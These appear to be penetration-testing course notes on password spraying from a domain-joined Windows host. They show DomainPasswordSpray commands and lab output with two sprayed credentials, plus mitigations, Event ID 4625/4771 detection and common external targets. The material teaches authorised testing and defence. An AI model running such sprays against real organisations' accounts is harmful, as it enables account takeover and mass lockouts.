# Internal Password Spraying - from Windows

From a domain-joined Windows foothold, **[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)** is highly effective — it can auto-generate the user list from AD, query the password policy, and automatically exclude near-lockout accounts.

**When you'd use this:** testing from a client-managed Windows device, on-site with a Windows VM, or after gaining an initial foothold and authenticating to a domain host to spray for an account with more privilege.

> [!note] If not domain-authenticated
> The tool can also accept a supplied user list (`-UserList`) the same way the Linux-side tools do, for cases where you're on a Windows host but not yet authenticated to the domain.

---

## Using DomainPasswordSpray.ps1

Since the host is domain-joined, we skip `-UserList` and let the tool auto-generate one. Supply `-Password` for the single password to spray, and `-OutFile` to log successes.

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

**What the tool does automatically before spraying:**
- Detects Fine-Grained Password Policy compatibility
- Pulls the full domain user list (2923 users here)
- Removes disabled accounts
- Detects the smallest lockout threshold in the domain (5 attempts)
- **Removes any account within 1 attempt of lockout** — built-in safety net
- Confirms before actually running (`[Y] Yes [N] No`)

> [!tip] Alternative: Kerbrute on Windows
> The same Kerbrute enumeration/spraying workflow from the Linux sections works here too — the tool is pre-staged in `C:\Tools` on the provided Windows attack host if you want to replicate those steps.

## Mitigations

No single control fully stops password spraying — a **defense-in-depth** approach is what makes it genuinely difficult.

| Technique | Description |
|---|---|
| **Multi-Factor Authentication** | Push notifications, rotating OTP (Google Authenticator), RSA key, SMS confirmation. Reduces account-takeover risk, but some MFA implementations still leak whether username/password combos are *valid* — that leaked signal can be reused against other exposed services. Should be applied on all external portals. |
| **Restricting Access** | Enforce least privilege — don't let every domain user log into every application regardless of role need. |
| **Reducing Impact of Successful Exploitation** | Separate accounts for privileged users' admin activities. App-specific permission levels. Network segmentation to contain lateral movement if a subnet is compromised. |
| **Password Hygiene** | Encourage passphrases over short complex passwords. Password filters to block dictionary words, month/season names, and company-name variations. |

> [!warning] Watch the lockout policy itself
> An overly restrictive lockout policy (especially one requiring **manual admin unlock**) can itself become a denial-of-service risk if a careless spray locks out many accounts quickly. Lockout policy tuning is a balance, not just "stricter is safer."

## Detection

**Signs of external spraying:**
- Many account lockouts in a short window
- Server/app logs showing many login attempts against valid **or non-existent** usernames
- Many requests in a short period to one specific application/URL

**In the DC's security log:**
- Frequent **Event ID 4625** (account failed to log on) in a short time window → classic SMB/NTLM spray indicator. Orgs should have correlation rules to alert on volume spikes.
- **Event ID 4771** (Kerberos pre-authentication failed) → indicates a more savvy attacker targeting LDAP/Kerberos instead of SMB (Kerberos logging must be enabled to catch this).

Further reading referenced in the module on Windows Security Event Logging-based spray detection is worth reviewing if building out detection rules for a client.

With mitigations tuned and logging enabled, an org is well-positioned to catch both internal and external spraying attempts.

## External Password Spraying

Outside this module's scope, but worth knowing — spraying is a very common way attackers gain an initial internet-facing foothold, frequently landing access to email or web apps. Common external targets:

- Microsoft O365
- Outlook Web Exchange (OWA)
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft RDS Portals
- Citrix portals (AD auth)
- VDI implementations using AD auth (e.g. VMware Horizon)
- VPN portals using AD auth (Citrix, SonicWall, OpenVPN, Fortinet, etc.)
- Custom web apps using AD authentication

## Key Takeaways

- [ ] `Invoke-DomainPasswordSpray -Password <pw> -OutFile <file>` — auto-builds the user list, detects lockout threshold, auto-excludes near-lockout accounts
- [ ] Confirmation prompt before spraying is a built-in safety check — don't blindly accept without reviewing the account count
- [ ] Kerbrute works identically from Windows (pre-staged in `C:\Tools` in the lab)
- [ ] Mitigation is layered: MFA + least privilege + segmentation + password hygiene, not any single fix
- [ ] Detection: Event ID 4625 (SMB/NTLM spray) and 4771 (Kerberos pre-auth failure, LDAP-targeted spray)
- [ ] Even a "secure" lockout policy can itself enable a DoS if misconfigured too strictly with manual-only unlock
- [ ] Spraying is equally common against external-facing portals (O365, OWA, VPNs, Citrix, custom AD-auth apps)
